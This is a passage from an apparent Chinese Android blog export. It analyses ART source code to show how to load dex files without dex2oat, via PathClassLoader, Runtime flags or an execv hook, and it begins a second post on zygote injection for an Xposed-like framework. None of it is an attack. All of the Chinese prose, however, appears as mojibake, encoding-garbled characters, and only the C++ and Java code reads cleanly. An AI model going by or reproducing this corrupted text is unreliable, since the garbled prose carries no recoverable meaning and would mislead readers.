ä¼¼ä¹æ˜¯ç”Ÿæˆoatå¤±è´¥å°±ä¼šç›´æ¥æŠ›ä¸€ä¸ªIOExceptionæ‹’ç»åŠ è½½ï¼Œemmmâ€¦â€¦æˆ‘ä»¬åœ¨Javaä»£ç é‡Œç”¨new DexClassLoader()çš„æ–¹å¼åŠ è½½dexï¼Œæœ€åä¼šè°ƒç”¨åˆ°DexFile.openDexFileNativeä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°æ˜¯è¿™æ ·çš„ï¼š12345678910111213141516171819202122232425static jlong DexFile_openDexFileNative(JNIEnv* env, jclass, jstring javaSourceName, jstring javaOutputName, jint) &#123; ScopedUtfChars sourceName(env, javaSourceName); if (sourceName.c_str() == NULL) &#123; return 0; &#125; NullableScopedUtfChars outputName(env, javaOutputName); if (env-&gt;ExceptionCheck()) &#123; return 0; &#125; ClassLinker* linker = Runtime::Current()-&gt;GetClassLinker(); std::unique_ptr&lt;std::vector&lt;const DexFile*&gt;&gt; dex_files(new std::vector&lt;const DexFile*&gt;()); std::vector&lt;std::string&gt; error_msgs; bool success = linker-&gt;OpenDexFilesFromOat(sourceName.c_str(), outputName.c_str(), &amp;error_msgs, dex_files.get()); if (success || !dex_files-&gt;empty()) &#123; // In the case of non-success, we have not found or could not generate the oat file. // But we may still have found a dex file that we can use. return static_cast&lt;jlong&gt;(reinterpret_cast&lt;uintptr_t&gt;(dex_files.release())); &#125; else &#123; // åŠ è½½å¤±è´¥çš„æƒ…å†µï¼Œçœç•¥ &#125;&#125;è¿™é‡Œçš„æ³¨é‡Šå¾ˆæœ‰æ„æ€ï¼Œå¦‚æœè¿”å›falseï¼ˆç”Ÿæˆoatå¤±è´¥ï¼‰ï¼Œä½†æ˜¯æœ‰è¢«æˆåŠŸåŠ è½½çš„dexï¼Œé‚£ä¹ˆè¿˜æ˜¯åº”è¯¥å½“åšæˆåŠŸã€‚å¯ä»¥çœ‹å‡ºå…·ä½“å®ç°åœ¨ClassLinkerä¸­çš„OpenDexFilesFromOaté‡Œï¼Œæˆ‘ä»¬ç‚¹è¿›å»çœ‹çœ‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// Multidex files make it possible that some, but not all, dex files can be broken/outdated. This// complicates the loading process, as we should not use an iterative loading process, because that// would register the oat file and dex files that come before the broken one. Instead, check all// multidex ahead of time.bool ClassLinker::OpenDexFilesFromOat(const char* dex_location, const char* oat_location, std::vector&lt;std::string&gt;* error_msgs, std::vector&lt;const DexFile*&gt;* dex_files) &#123; // 1) Check whether we have an open oat file. // This requires a dex checksum, use the \"primary\" one. bool needs_registering = false; const OatFile::OatDexFile* oat_dex_file = FindOpenedOatDexFile(oat_location, dex_location, dex_location_checksum_pointer); std::unique_ptr&lt;const OatFile&gt; open_oat_file( oat_dex_file != nullptr ? oat_dex_file-&gt;GetOatFile() : nullptr); // 2) If we do not have an open one, maybe there's one on disk already. // In case the oat file is not open, we play a locking game here so // that if two different processes race to load and register or generate // (or worse, one tries to open a partial generated file) we will be okay. // This is actually common with apps that use DexClassLoader to work // around the dex method reference limit and that have a background // service running in a separate process. ScopedFlock scoped_flock; if (open_oat_file.get() == nullptr) &#123; if (oat_location != nullptr) &#123; std::string error_msg; // We are loading or creating one in the future. Time to set up the file lock. if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); return false; &#125; // TODO Caller specifically asks for this oat_location. We should honor it. Probably? open_oat_file.reset(FindOatFileInOatLocationForDexFile(dex_location, dex_location_checksum, oat_location, &amp;error_msg)); if (open_oat_file.get() == nullptr) &#123; std::string compound_msg = StringPrintf(\"Failed to find dex file '%s' in oat location '%s': %s\", dex_location, oat_location, error_msg.c_str()); VLOG(class_linker) &lt;&lt; compound_msg; error_msgs-&gt;push_back(compound_msg); &#125; &#125; else &#123; // TODO: What to lock here? bool obsolete_file_cleanup_failed; open_oat_file.reset(FindOatFileContainingDexFileFromDexLocation(dex_location, dex_location_checksum_pointer, kRuntimeISA, error_msgs, &amp;obsolete_file_cleanup_failed)); // There's no point in going forward and eventually try to regenerate the // file if we couldn't remove the obsolete one. Mostly likely we will fail // with the same error when trying to write the new file. // TODO: should we maybe do this only when we get permission issues? (i.e. EACCESS). if (obsolete_file_cleanup_failed) &#123; return false; &#125; &#125; needs_registering = true; &#125; // 3) If we have an oat file, check all contained multidex files for our dex_location. // Note: LoadMultiDexFilesFromOatFile will check for nullptr in the first argument. bool success = LoadMultiDexFilesFromOatFile(open_oat_file.get(), dex_location, dex_location_checksum_pointer, false, error_msgs, dex_files); if (success) &#123; // æˆ‘ä»¬æ²¡æœ‰æœ‰æ•ˆçš„oatæ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ä¼šèµ°åˆ°è¿™é‡Œ &#125; else &#123; if (needs_registering) &#123; // We opened it, delete it. open_oat_file.reset(); &#125; else &#123; open_oat_file.release(); // Do not delete open oat files. &#125; &#125; // 4) If it's not the case (either no oat file or mismatches), regenerate and load. // Look in cache location if no oat_location is given. std::string cache_location; if (oat_location == nullptr) &#123; // Use the dalvik cache. const std::string dalvik_cache(GetDalvikCacheOrDie(GetInstructionSetString(kRuntimeISA))); cache_location = GetDalvikCacheFilenameOrDie(dex_location, dalvik_cache.c_str()); oat_location = cache_location.c_str(); &#125; bool has_flock = true; // Definitely need to lock now. if (!scoped_flock.HasFile()) &#123; std::string error_msg; if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); has_flock = false; &#125; &#125; if (Runtime::Current()-&gt;IsDex2OatEnabled() &amp;&amp; has_flock &amp;&amp; scoped_flock.HasFile()) &#123; // Create the oat file. open_oat_file.reset(CreateOatFileForDexLocation(dex_location, scoped_flock.GetFile()-&gt;Fd(), oat_location, error_msgs)); &#125; // Failed, bail. if (open_oat_file.get() == nullptr) &#123; // å¦‚æœæ— æ³•ç”Ÿæˆoatï¼Œé‚£ä¹ˆç›´æ¥åŠ è½½dex std::string error_msg; // dex2oat was disabled or crashed. Add the dex file in the list of dex_files to make progress. DexFile::Open(dex_location, dex_location, &amp;error_msg, dex_files); error_msgs-&gt;push_back(error_msg); return false; &#125; // å†æ¬¡å°è¯•åŠ è½½oatï¼Œæ— å…³ï¼Œçœç•¥&#125;è¿™ä¸ªå‡½æ•°æ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥åšäº†ä¸€ç‚¹ç²¾ç®€ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œçœ‹åˆ°äº†ä¸€ç‚¹ç«¯å€ªï¼Œè¿™ä¸ªå‡½æ•°åšäº†è¿™äº›äº‹æƒ…ï¼šæ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å·²ç»æœ‰ä¸€ä¸ªæ‰“å¼€äº†çš„oatå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆæ£€æŸ¥oatç¼“å­˜ç›®å½•ï¼ˆåˆ›å»ºDexClassLoaderæ—¶ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰æ˜¯å¦å·²ç»æœ‰äº†ä¸€ä¸ªoatï¼Œå¹¶ä¸”æ£€æŸ¥è¿™ä¸ªoatçš„æœ‰æ•ˆæ€§å¦‚æœæ²¡æœ‰æˆ–è€…è¿™ä¸ªoatæ˜¯æ— æ•ˆçš„ï¼Œé‚£ä¹ˆç”Ÿæˆä¸€ä¸ªoatæ–‡ä»¶æˆ‘ä»¬é¦–æ¬¡åŠ è½½dexæ—¶ï¼Œè‚¯å®šæ²¡æœ‰æœ‰æ•ˆçš„oatï¼Œæœ€åä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„oatï¼š12345if (Runtime::Current()-&gt;IsDex2OatEnabled() &amp;&amp; has_flock &amp;&amp; scoped_flock.HasFile()) &#123; // Create the oat file. open_oat_file.reset(CreateOatFileForDexLocation(dex_location, scoped_flock.GetFile()-&gt;Fd(), oat_location, error_msgs));&#125;è¿™é‡Œæœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼Œç›´æ¥å†³å®šæ˜¯å¦è¿›è¡Œdex2oatï¼Œæˆ‘ä»¬çœ‹çœ‹èƒ½ä¸èƒ½é€šè¿‡å„ç§æ‰‹æ®µè®©è¿™ä¸ªåˆ¤æ–­ä¸æˆç«‹ã€‚ç¦ç”¨dex2oatç¬¬ä¸€æ‹›ï¼šä¿®æ”¹Runtimeä¸­çš„å˜é‡è¿™ä¸ªifåˆ¤æ–­é‡Œï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶å°±æ˜¯Runtime::Current()-&gt;IsDex2OatEnabled()ï¼Œå¦‚æœè¿”å›falseï¼Œé‚£ä¹ˆå°±ä¸ä¼šç”Ÿæˆoatã€‚è¿™ä¸ªå‡½æ•°çš„å®ç°å¦‚ä¸‹ï¼š1234567bool IsDex2OatEnabled() const &#123; return dex2oat_enabled_ &amp;&amp; IsImageDex2OatEnabled();&#125;bool IsImageDex2OatEnabled() const &#123; return image_dex2oat_enabled_;&#125;dex2oat_enabled_ä¸image_dex2oat_enabled_éƒ½æ˜¯Runtimeå¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡ï¼Œè€ŒRuntimeå¯ä»¥é€šè¿‡JavaVMè·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹è¿™ä¸ªå€¼å°±èƒ½ç¦ç”¨dex2oatã€‚å·²ç»æœ‰å…¶ä»–äººå®ç°äº†è¿™ä¸€æ­¥ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹è¿™ç¯‡åšå®¢ã€‚ç„¶è€Œäº‹æƒ…çœŸçš„ä¼šè¿™ä¹ˆç®€å•å—ï¼ŸæŸ¥çœ‹æºç å‘ç°Runtimeæ˜¯ä¸€ä¸ªç‚’é¸¡å¤§çš„ç»“æ„ä½“ï¼ŒAndroidé‡Œæœ‰ä»€ä¹ˆä¸œè¥¿éƒ½å¾€è¿™æ‰”ï¼Œä½ å‡ ä¹å¯ä»¥ä»Runtimeå¯¹è±¡ä¸Šç›´æ¥æˆ–é—´æ¥è·å–åˆ°ä»»ä½•ä¸œè¥¿ï¼Œç„¶è€Œä¹Ÿæ­£æ˜¯å› ä¸ºRuntimeå¤ªå¤§äº†ï¼Œä½¿å¾—æ²¡æœ‰ä»€ä¹ˆå¥½çš„åŠæ³•è·å–é‡Œé¢çš„å€¼ã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ï¼šç¬¬äºŒæ‹›ï¼šä½¿ç”¨PathClassLoaderæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œåœ¨ifåˆ¤æ–­é‡Œï¼Œè¿˜æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼šhas_flockå’Œscoped_flock.HasFile()ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦å¯ä»¥è®©è¿™ä¸¤ä¸ªæ¡ä»¶ä¸æˆç«‹ã€‚has_flockçš„èµ‹å€¼ï¼š123456789bool has_flock = true;// Definitely need to lock now.if (!scoped_flock.HasFile()) &#123; std::string error_msg; if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); has_flock = false; &#125;&#125;åˆæ˜¯scoped_flockï¼Œçœ‹çœ‹åœ¨ä¸Šé¢scoped_flockå¯èƒ½åœ¨å“ªé‡Œè¢«åˆå§‹åŒ–ï¼š12345678910111213ScopedFlock scoped_flock;if (open_oat_file.get() == nullptr) &#123; if (oat_location != nullptr) &#123; std::string error_msg; // We are loading or creating one in the future. Time to set up the file lock. if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); return false; &#125; // çœç•¥ä»£ç  &#125;&#125;çœ‹çœ‹ScopedFlockçš„Initæ–¹æ³•ï¼š12345678910bool ScopedFlock::Init(const char* filename, std::string* error_msg) &#123; while (true) &#123; file_.reset(OS::OpenFileWithFlags(filename, O_CREAT | O_RDWR)); if (file_.get() == NULL) &#123; *error_msg = StringPrintf(\"Failed to open file '%s': %s\", filename, strerror(errno)); return false; &#125; // çœç•¥ä¸€å¤§å †ä»£ç â€¦â€¦ &#125;&#125;å¯ä»¥çœ‹è§ï¼Œä¼šæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œflagsä¸ºO_CREAT | O_RDWRï¼Œé‚£æˆ‘ä»¬åªéœ€è¦è®¾ç½®oat_locationä¸ºä¸å¯å†™çš„è·¯å¾„ï¼Œå°±èƒ½è®©ScopedFlock::Initè¿”å›falseã€‚ä¸è¿‡æˆ‘ä»¬è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœoat_locationä¸ä¸ºnullå¹¶ä¸”æ— æ³•ä½¿ç”¨ï¼Œé‚£åœ¨ä¸Šé¢çš„ä¸€ä¸ªåˆ¤æ–­é‡Œå°±ä¼šç›´æ¥è¿”å›falseã€‚æ€ä¹ˆåŠï¼Ÿæ˜¯æ—¶å€™è¯·å‡ºæˆ‘ä»¬çš„ä¸»è§’PathClassLoaderäº†ï¼PathClassLoaderä½œä¸ºDexClassLoaderçš„å…„å¼Ÿï¼ˆä¹Ÿå¯èƒ½æ˜¯å§å¦¹ï¼Ÿï¼‰ï¼Œå—åˆ°çš„å¾…é‡ä¸DexClassLoaderæˆªç„¶ä¸åŒï¼šç½‘ä¸Šè®²è§£åŠ¨æ€åŠ è½½dexçš„æ–‡ç« å‡ ä¹éƒ½åªè®²DexClassLoaderï¼Œè€Œå¯¹äºPathClassLoaderåˆ™æ˜¯ä¸€ç¬”å¸¦è¿‡ï¼šâ€œPathClassLoaderåªèƒ½åŠ è½½ç³»ç»Ÿä¸­å·²ç»å®‰è£…è¿‡çš„apkâ€ã€‚ç„¶è€Œäº‹å®çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿæˆ–è®¸Android 5.0ä»¥å‰æ˜¯ï¼Œä½†Android 5.0æ—¶å°±å·²ç»å¯ä»¥åŠ è½½å¤–éƒ¨dexäº†ï¼Œä»Šå¤©æˆ‘è¦ä¸ºPathClassLoaderæ­£åï¼è®©æˆ‘ä»¬æ¥å¯¹æ¯”ä¸€ä¸‹DexClassLoaderå’ŒPathClassLoaderçš„æºç ã€‚DexClassLoaderï¼š123456public class DexClassLoader extends BaseDexClassLoader &#123; public DexClassLoader(String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent) &#123; super(dexPath, new File(optimizedDirectory), libraryPath, parent); &#125;&#125;å¯¹ï¼Œä½ æ²¡çœ‹é”™ï¼Œæœ‰æ•ˆä»£ç å°±è¿™ä¹ˆç‚¹ã€‚è®©æˆ‘ä»¬å†çœ‹çœ‹PathClassLoaderçš„æºç ï¼š12345678910public class PathClassLoader extends BaseDexClassLoader &#123; public PathClassLoader(String dexPath, ClassLoader parent) &#123; super(dexPath, null, null, parent); &#125; public PathClassLoader(String dexPath, String libraryPath, ClassLoader parent) &#123; super(dexPath, null, libraryPath, parent); &#125;&#125;å®é™…ä¸Šæ‰€ä»¥å®ç°ä»£ç éƒ½åœ¨BaseDexClassLoaderä¸­ï¼ŒDexClassLoaderå’ŒPathClassLoaderéƒ½è°ƒç”¨äº†åŒä¸€ä¸ªæ„é€ å‡½æ•°ï¼š123456789public class BaseDexClassLoader extends ClassLoader &#123; private final DexPathList pathList; public BaseDexClassLoader(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent) &#123; super(parent); this.pathList = new DexPathList(this, dexPath, libraryPath, optimizedDirectory); &#125;&#125;æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°ï¼ŒoptimizedDirectoryï¼ŒDexClassLoaderä¼ å…¥çš„æ˜¯new File(optimizedDirectory)ï¼Œè€ŒPathClassLoaderä¼ å…¥çš„æ˜¯nullã€‚è®°ä½è¿™ä¸€ç‚¹ã€‚è¿™ä¸¤ç§æƒ…å†µæœ€åéƒ½ä¼šè°ƒç”¨åˆ°DexFile.openDexFileNativeä¸­1private static native long openDexFileNative(String sourceName, String outputName, int flags);å¦‚æœæ˜¯PathClassLoaderï¼ŒoutputNameä¸ºnullï¼Œä¼šè¿›å…¥è¿™ä¸ªifåˆ†æ”¯ä¸­ï¼š12345678// Look in cache location if no oat_location is given.std::string cache_location;if (oat_location == nullptr) &#123; // Use the dalvik cache. const std::string dalvik_cache(GetDalvikCacheOrDie(GetInstructionSetString(kRuntimeISA))); cache_location = GetDalvikCacheFilenameOrDie(dex_location, dalvik_cache.c_str()); oat_location = cache_location.c_str();&#125;è¿™é‡Œä¼šæŠŠoat_locationè®¾ç½®æˆ/data/dalvik-cache/ä¸‹çš„è·¯å¾„ï¼Œæ¥ä¸‹æ¥å› ä¸ºæˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰å¯¹dalvik-cacheçš„å†™å…¥æƒé™ï¼Œæ‰€ä»¥æ— æ³•æ‰“å¼€fdï¼Œç„¶åå°±ä¼šèµ°åˆ°è¿™é‡Œç›´æ¥åŠ è½½åŸå§‹dexï¼š1234567if (open_oat_file.get() == nullptr) &#123; std::string error_msg; // dex2oat was disabled or crashed. Add the dex file in the list of dex_files to make progress. DexFile::Open(dex_location, dex_location, &amp;error_msg, dex_files); error_msgs-&gt;push_back(error_msg); return false;&#125;è‡³æ­¤æ•´ä¸ªé€»è¾‘å·²ç»æ˜æœ—ï¼Œé€šè¿‡PathClassLoaderåŠ è½½ä¼šæŠŠoatè¾“å‡ºè·¯å¾„è®¾ç½®æˆ/data/dalvik-cache/ä¸‹ï¼Œç„¶åå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å¯¹dalvik-cacheçš„å†™å…¥æƒé™ï¼Œæ‰€ä»¥æ— æ³•æ‰“å¼€fdï¼Œä¹‹åä¼šç›´æ¥åŠ è½½åŸå§‹dexï¼Œä¸ä¼šè¿›è¡Œdex2oatã€‚ï¼ˆæ³¨ï¼šæœ¬æ–‡åˆ†ææºç æ˜¯Android 5.0ï¼Œåœ¨Android 8.1æ—¶æºç æœ‰æ”¹åŠ¨ï¼Œå°±ç®—æ˜¯DexClassLoaderä¹Ÿä¼šæŠŠoptimizedDirectoryè®¾ç½®æˆnullï¼Œè¾“å‡ºçš„oatåœ¨dexçš„çˆ¶ç›®å½•/oat/ä¸‹ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡PathClassLoaderå¿«é€ŸåŠ è½½dexï¼Œä½†åœ¨8.1æ—¶å·²ç»æœ‰InMemoryDexClassLoaderäº†ï¼Œç›´æ¥é€šè¿‡InMemoryDexClassLoaderåŠ è½½å°±å¥½äº†ã€‚ç®€å•åšäº†ä¸ªå°æµ‹è¯•ï¼Œåœ¨æˆ‘çš„AVDï¼ˆAndroid 7.1.1ï¼‰ä¸Šï¼Œç”¨DexClassLoaderåŠ è½½75Mçš„qq apkç”¨äº†è¿‘80ç§’ï¼Œå¹¶ç”Ÿæˆäº†ä¸€ä¸ª313Mçš„oatï¼Œè€ŒPathClassLoaderç”¨æ—¶ç¨³å®šåœ¨2ç§’å·¦å³ï¼Œemmmâ€¦â€¦çœ‹èµ·æ¥æˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„åŠæ³•ç¦ç”¨dex2oatäº†ï¼Œä¸è¿‡éœ€è¦ä¿®æ”¹æºç æ²¡æ³•ç›´æ¥å…¨å±€ç¦ç”¨ï¼Œä¿®æ”¹Runtimeé£é™©åˆå¤ªå¤§ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ã€‚ç¬¬ä¸‰æ‹›ï¼šhook execvåˆ°äº†è¿™é‡Œï¼Œä¸Šé¢é‚£ä¸ªåˆ¤æ–­è‚¯å®šä¼šæˆç«‹äº†ï¼Œä¼¼ä¹è¿›è¡Œdex2oatå·²æˆå®šå±€ï¼Ÿæˆ‘ä»¬ç»§ç»­çœ‹CreateOatFileForDexLocationã€‚1234567891011121314151617181920212223const OatFile* ClassLinker::CreateOatFileForDexLocation(const char* dex_location, int fd, const char* oat_location, std::vector&lt;std::string&gt;* error_msgs) &#123; // Generate the output oat file for the dex file VLOG(class_linker) &lt;&lt; \"Generating oat file \" &lt;&lt; oat_location &lt;&lt; \" for \" &lt;&lt; dex_location; std::string error_msg; if (!GenerateOatFile(dex_location, fd, oat_location, &amp;error_msg)) &#123; CHECK(!error_msg.empty()); error_msgs-&gt;push_back(error_msg); return nullptr; &#125; std::unique_ptr&lt;OatFile&gt; oat_file(OatFile::Open(oat_location, oat_location, nullptr, !Runtime::Current()-&gt;IsCompiler(), &amp;error_msg)); if (oat_file.get() == nullptr) &#123; std::string compound_msg = StringPrintf(\"\\nFailed to open generated oat file '%s': %s\", oat_location, error_msg.c_str()); error_msgs-&gt;push_back(compound_msg); return nullptr; &#125; return oat_file.release();&#125;GenerateOatFileæ˜¯æ ¸å¿ƒé€»è¾‘ï¼Œè¿™ä¸ªå‡½æ•°å¤§éƒ¨åˆ†éƒ½æ˜¯æˆ‘ä»¬ä¸å…³å¿ƒçš„é…ç½®dex2oatå‚æ•°å°±ä¸è´´å‡ºæ¥äº†ï¼Œæœ€åä¼šforkå‡ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œç„¶ååœ¨å­è¿›ç¨‹é‡Œæ‰§è¡Œexecv()è°ƒç”¨dex2oatã€‚çœ‹èµ·æ¥æˆ‘ä»¬å¿…ç„¶è¦æ‰§è¡Œdex2oatäº†ï¼Ÿåˆ«æ…Œï¼Œè¿˜æœ‰åŠæ³•ã€‚è™½ç„¶æ²¡æœ‰ç›´æ¥çš„å¼€å…³å»é˜»æ­¢dex2oatï¼Œä½†æˆ‘ä»¬è¿˜æœ‰hookå¤§æ³•ï¼ç”Ÿæˆoatæœ€åæ˜¯é€šè¿‡execvè°ƒç”¨dex2oatè¿›è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥hookæ‰execvå‡½æ•°ï¼Œå¦‚æœæ˜¯æ‰§è¡Œdex2oaté‚£ä¹ˆç›´æ¥è®©è¿™ä¸ªè¿›ç¨‹é€€å‡ºå³å¯ï¼Lodyå¤§ç¥çš„æ—©æœŸä½œå“TurboDexå°±æ˜¯è¿™æ ·å®ç°çš„ã€‚ä¸è¿‡è¿™ä¸ªé¡¹ç›®å…¶å®è¿˜å¯ä»¥ä¼˜åŒ–ä¸€ä¸‹ï¼šTurboDexæ˜¯ä½¿ç”¨çš„Substrateè¿›è¡Œhookï¼Œè¿™æ˜¯ä¸€ä¸ªinline hookåº“ï¼Œè€Œexecvæ˜¯æ¥è‡ªlibc.soçš„å¯¼å‡ºç¬¦å·ï¼Œå…¶å®ç›´æ¥é€šè¿‡GOT Hookå°±èƒ½hookåˆ°ï¼Œæ²¡æœ‰å¿…è¦å»ç”¨inline hookï¼Œåè€Œå¢åŠ crashé£é™©ã€‚æ€»ç»“æœ¬æ¥æˆ‘åªæ˜¯ä¸ºäº†ç ”ç©¶DexClassLoaderä¸PathClassLoaderçš„åŒºåˆ«çš„ï¼Œç½‘ä¸Šçš„æ–‡ç« å’Œå®éªŒçš„ç»“æœå®Œå…¨ä¸ä¸€æ ·ï¼Œç»“æœæ„å¤–å‘ç°ä¸€ä¸ªå¿«é€ŸåŠ è½½dexçš„æ–¹æ³•ï¼Œå°±å†™å‡ºæ¥äº† :)è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œæ²¡äº‹å¤šçœ‹æºç ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰å¦å¤–ä¸ªäººå»ºè®®ï¼Œå¿«é€ŸåŠ è½½dexä¹‹ååå°å¯ä»¥å¼€ä¸€ä¸ªçº¿ç¨‹å•ç‹¬è¿›è¡Œdex2oatï¼Œå…·ä½“å¯ä»¥å‚è€ƒArtDexOptimizerï¼Œä¸‹æ¬¡å¯åŠ¨çš„æ—¶å€™å¦‚æœå®Œæˆäº†å¯ä»¥ç›´æ¥ç”¨ç”Ÿæˆå¥½çš„oatæ–‡ä»¶ï¼Œæ¯•ç«Ÿç”¨oatæ¯”ç›´æ¥åŠ è½½dexå¿«å¾—å¤šï¼Œè€Œä¸”æ›´ç¨³å®š~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"dex","slug":"dex","permalink":"https://blog.canyie.top/tags/dex/"}]},{"title":"è¯•ç€å†™äº†ä¸€ä¸ªç±»Xposedæ¡†æ¶","slug":"a-new-xposed-style-framework","date":"2020-02-03T06:51:21.000Z","updated":"2020-02-05T06:10:23.000Z","comments":true,"path":"2020/02/03/a-new-xposed-style-framework/","link":"","permalink":"https://blog.canyie.top/2020/02/03/a-new-xposed-style-framework/","excerpt":"æ–°äººç¬¬ä¸€æ¬¡å†™åšå®¢ï¼Œå‹¿å–·..æœ¬æ–‡ä¹Ÿå‘å¸ƒåœ¨çŸ¥ä¹ä¸ŠXposedæ¡†æ¶åœ¨Androidä¸Šæ˜¯ç¥å™¨èˆ¬çš„å­˜åœ¨ï¼Œå®ƒç»™äº†æ™®é€šç”¨æˆ·éšæ„å®šåˆ¶ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œå„ç§éªšæ“ä½œå±‚å‡ºä¸ç©·ã€‚éšç€å’±å¯¹Androidçš„äº†è§£è¶Šæ¥è¶Šæ·±ï¼ˆå…¶å®ä¸€ç‚¹éƒ½ä¸æ·±..ï¼‰ï¼Œé€æ¸å†’å‡ºäº†è‡ªå·±å†™ä¸€ä¸ªç±»Xposedæ¡†æ¶çš„æƒ³æ³•ï¼Œæœ€ç»ˆæå‡ºäº†è¿™ä¸ªå‹‰å¼ºèƒ½ç”¨çš„åŠæˆå“ã€‚ä»£ç åœ¨è¿™ï¼šDreamland &amp; Dreamland Manager ï¼Œä»£ç å†™çš„å¾ˆè¾£é¸¡ï¼Œæ±‚è½»å–·QAQæ¥ä¸‹æ¥ä¼šä»‹ç»ä¸€ä¸‹å®ç°ç»†èŠ‚ä¸é‡åˆ°çš„é—®é¢˜ã€‚","text":"æ–°äººç¬¬ä¸€æ¬¡å†™åšå®¢ï¼Œå‹¿å–·..æœ¬æ–‡ä¹Ÿå‘å¸ƒåœ¨çŸ¥ä¹ä¸ŠXposedæ¡†æ¶åœ¨Androidä¸Šæ˜¯ç¥å™¨èˆ¬çš„å­˜åœ¨ï¼Œå®ƒç»™äº†æ™®é€šç”¨æˆ·éšæ„å®šåˆ¶ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œå„ç§éªšæ“ä½œå±‚å‡ºä¸ç©·ã€‚éšç€å’±å¯¹Androidçš„äº†è§£è¶Šæ¥è¶Šæ·±ï¼ˆå…¶å®ä¸€ç‚¹éƒ½ä¸æ·±..ï¼‰ï¼Œé€æ¸å†’å‡ºäº†è‡ªå·±å†™ä¸€ä¸ªç±»Xposedæ¡†æ¶çš„æƒ³æ³•ï¼Œæœ€ç»ˆæå‡ºäº†è¿™ä¸ªå‹‰å¼ºèƒ½ç”¨çš„åŠæˆå“ã€‚ä»£ç åœ¨è¿™ï¼šDreamland &amp; Dreamland Manager ï¼Œä»£ç å†™çš„å¾ˆè¾£é¸¡ï¼Œæ±‚è½»å–·QAQæ¥ä¸‹æ¥ä¼šä»‹ç»ä¸€ä¸‹å®ç°ç»†èŠ‚ä¸é‡åˆ°çš„é—®é¢˜ã€‚æ³¨å…¥ zygote è¿›ç¨‹æˆ‘ä»¬æƒ³å®ç°Xposedé‚£æ ·åœ¨ç›®æ ‡è¿›ç¨‹åŠ è½½è‡ªå·±çš„æ¨¡å—ï¼Œå°±å¿…é¡»æŠŠæˆ‘ä»¬è‡ªå·±çš„ä»£ç æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œè€Œä¸”æˆ‘ä»¬çš„ä»£ç æ‰§è¡Œçš„æ—¶æœºè¿˜éœ€è¦è¶³å¤Ÿæ—©ï¼Œä¸€èˆ¬æ¥è¯´éƒ½æ˜¯é€‰æ‹©ç›´æ¥æ³¨å…¥åˆ°zygoteè¿›ç¨‹ã€‚å…ˆæ¥çœ‹çœ‹å…¶ä»–æ¡†æ¶çš„å®ç°ï¼šXposed ï¼šXposed for art é‡æ–°å®ç°äº†app_processï¼Œlibart.soç­‰é‡è¦ç³»ç»Ÿåº“ï¼Œå®‰è£…æ—¶ä¼šæ›¿æ¢è¿™äº›æ–‡ä»¶ï¼Œè€Œå„å¤§å‚å•†å‡ ä¹æ²¡æœ‰ä¸ä¿®æ”¹å®ƒä»¬çš„ï¼Œä¸€æ—¦è¢«æ›¿æ¢å¾ˆå¯èƒ½å˜ç –ï¼Œå¯¼è‡´Xposedåœ¨éåŸç”Ÿç³»ç»Ÿä¸Šçš„ç¨³å®šæ€§å¾ˆå·®ã€‚EdXposed : EdXpä¾èµ– Riru è€ŒRiruæ˜¯é€šè¿‡æ›¿æ¢libmemtrack.soæ¥å®ç°ï¼Œè¿™ä¸ªsoåº“ä¼šåœ¨zygoteè¿›ç¨‹å¯åŠ¨æ—¶è¢«åŠ è½½ï¼Œå¹¶ä¸”æ¯”libartè½»å¾—å¤šï¼ˆåªæœ‰10ä¸ªå¯¼å‡ºå‡½æ•°ï¼‰ï¼Œç„¶åå°±å¯ä»¥åœ¨zygoteè¿›ç¨‹é‡Œæ‰§è¡Œä»»æ„ä»£ç ã€‚å¤ªæé˜³ : 